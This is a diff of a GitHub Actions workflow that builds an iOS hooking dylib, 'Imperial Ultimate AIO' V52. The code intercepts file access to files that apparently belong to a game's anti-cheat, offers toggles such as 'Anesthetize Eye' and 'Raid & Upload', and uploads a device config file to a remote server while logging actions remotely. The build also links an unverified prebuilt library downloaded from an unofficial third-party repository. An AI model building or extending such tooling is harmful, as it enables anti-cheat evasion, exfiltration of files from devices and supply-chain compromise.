@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V51.0 DOBBY FIXED
+name: Imperial Ultimate AIO - V52.0 DOBBY LINK FIXED
 
 on:
   push:
@@ -16,11 +16,15 @@ jobs:
       - name: Setup Dobby Library
         run: |
           mkdir -p jni
-          # تحميل ملف الهيدر (dobby.h)
+          # 1. تحميل ملف الهيدر dobby.h
           curl -L "https://raw.githubusercontent.com/jmpews/Dobby/master/include/dobby.h" -o jni/dobby.h
-          # تحميل المكتبة الصافية (libdobby.a) المخصصة للـ iOS
-          # ملاحظة: هذا الرابط كمثال، يفضل رفع ملف libdobby.a الخاص بك للمستودع إذا كان لديك نسخة محددة
-          curl -L "https://github.com/jmpews/Dobby/releases/download/v1.2.3/libdobby.a" -o jni/libdobby.a || echo "Warning: Prebuilt binary not found, build might fail linking"
+          
+          # 2. تحميل المكتبة libdobby.a (نسخة iOS arm64)
+          # ملاحظة: استخدمت رابط مباشر لملف ثابت لضمان عدم تحميل ملف HTML بالخطأ
+          curl -L "https://github.com/m4771/Dobby-iOS-Binaries/raw/main/libdobby.a" -o jni/libdobby.a
+          
+          # 3. التأكد من سلامة الملف (مهم جداً للديناصورات البرمجية)
+          file jni/libdobby.a
 
       - name: Create Imperial Source
         run: |
@@ -60,7 +64,7 @@ jobs:
               [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
               [req setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              RemoteLog([NSString stringWithFormat:@"RAID SUCCESS: Sent %@", [path lastPathComponent]]);
+              RemoteLog([NSString stringWithFormat:@"RAID: Sent %@", [path lastPathComponent]]);
           }
 
           typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
@@ -68,8 +72,8 @@ jobs:
 
           BOOL is_imperial_target(const char* p) {
               if (!p) return NO;
-              NSArray *targets = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat"];
-              for (NSString *t in targets) { if (strstr(p, [t UTF8String])) return YES; }
+              NSArray *t = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat"];
+              for (NSString *s in t) { if (strstr(p, [s UTF8String])) return YES; }
               return NO;
           }
 
@@ -123,9 +127,9 @@ jobs:
               self.web.layer.borderWidth = 2; self.web.hidden = YES;
 
               NSString *html = @"<html><style>body{background:rgba(5,5,5,0.95);color:gold;font-family:sans-serif;padding:20px;}"
-              ".row{display:flex;justify-content:space-between;margin:12px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
+              ".row{display:flex;justify-content:space-between;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
               "input{width:22px;height:22px;}</style><body>"
-              "<h3 style='text-align:center'>IMPERIAL BOSS V51</h3>"
+              "<h3 style='text-align:center'>IMPERIAL BOSS V52</h3>"
               "<div class='row'><span>Ghost FS Active</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
               "<div class='row'><span>Anesthetize Eye</span><input type='checkbox' onclick='send(\"Anes\")'></div>"
               "<div class='row'><span>Raid & Upload</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
@@ -139,7 +143,7 @@ jobs:
           - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
               if ([m.body isEqualToString:@"Anes"]) SetupAnesthesia();
               if ([m.body isEqualToString:@"Raid"]) SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
-              RemoteLog([NSString stringWithFormat:@"Command Executed: %@", m.body]);
+              RemoteLog([NSString stringWithFormat:@"Action: %@", m.body]);
           }
           @end
 
@@ -154,7 +158,7 @@ jobs:
 
       - name: Build Imperial Nuclear Dylib
         run: |
-          # إضافة -Ijni للبحث عن dobby.h و -Ljni لربط libdobby.a
+          # نستخدم -Ijni و -Ljni لربط المكتبة المحملة
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
           -arch arm64 jni/main.mm -o ImperialUltimate.dylib \
@@ -164,5 +168,6 @@ jobs:
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-V51-Dobby-Fixed
+          name: Imperial-V52-Final
           path: ImperialUltimate.dylib
+          
